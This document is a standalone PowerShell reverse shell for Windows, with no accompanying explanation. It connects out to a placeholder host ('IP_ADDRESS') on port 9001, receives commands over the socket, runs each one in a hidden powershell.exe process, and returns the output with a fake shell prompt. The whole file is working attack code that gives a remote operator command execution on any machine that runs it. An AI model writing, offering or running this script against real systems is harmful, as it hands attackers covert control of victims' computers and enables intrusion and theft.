# windows 
Add-Type -AssemblyName System.Net.Primitives
Add-Type -AssemblyName System.Net.Sockets

function Main {
    $host = 'IP_ADDRESS'
    $port = 9001

    try {
        # Create TCP socket and connect
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($host, $port)
        $stream = $client.GetStream()
        $buffer = New-Object byte[] 65536

        while ($true) {
            # Receive data from the server
            $read = $stream.Read($buffer, 0, $buffer.Length)
            if ($read -le 0) { break }

            # Decode the command
            $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read).Trim()

            # Execute the command
            try {
                $output = ""
                $errorOutput = ""

                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = "powershell.exe"
                $psi.Arguments = "-NoProfile -Command $command"
                $psi.RedirectStandardOutput = $true
                $psi.RedirectStandardError = $true
                $psi.UseShellExecute = $false
                $psi.CreateNoWindow = $true

                $process = New-Object System.Diagnostics.Process
                $process.StartInfo = $psi
                $process.Start() | Out-Null

                if (-not $process.WaitForExit(30000)) {
                    $process.Kill()
                    throw "Command timed out"
                }

                $output = $process.StandardOutput.ReadToEnd()
                $errorOutput = $process.StandardError.ReadToEnd()

                $combinedOutput = $output
                if ($errorOutput) {
                    $combinedOutput += $errorOutput
                }

                $currentDir = (Get-Location).Path
                $sendback = $combinedOutput + "`nPS $currentDir> "
            }
            catch {
                $currentDir = (Get-Location).Path
                $sendback = "Error: $($_.Exception.Message)`nPS $currentDir> "
            }

            # Send response back
            $sendBytes = [System.Text.Encoding]::ASCII.GetBytes($sendback)
            $stream.Write($sendBytes, 0, $sendBytes.Length)
        }
    }
    catch {
        Write-Host "Connection error: $($_.Exception.Message)"
    }
    finally {
        if ($client) {
            $client.Close()
        }
    }
}

Main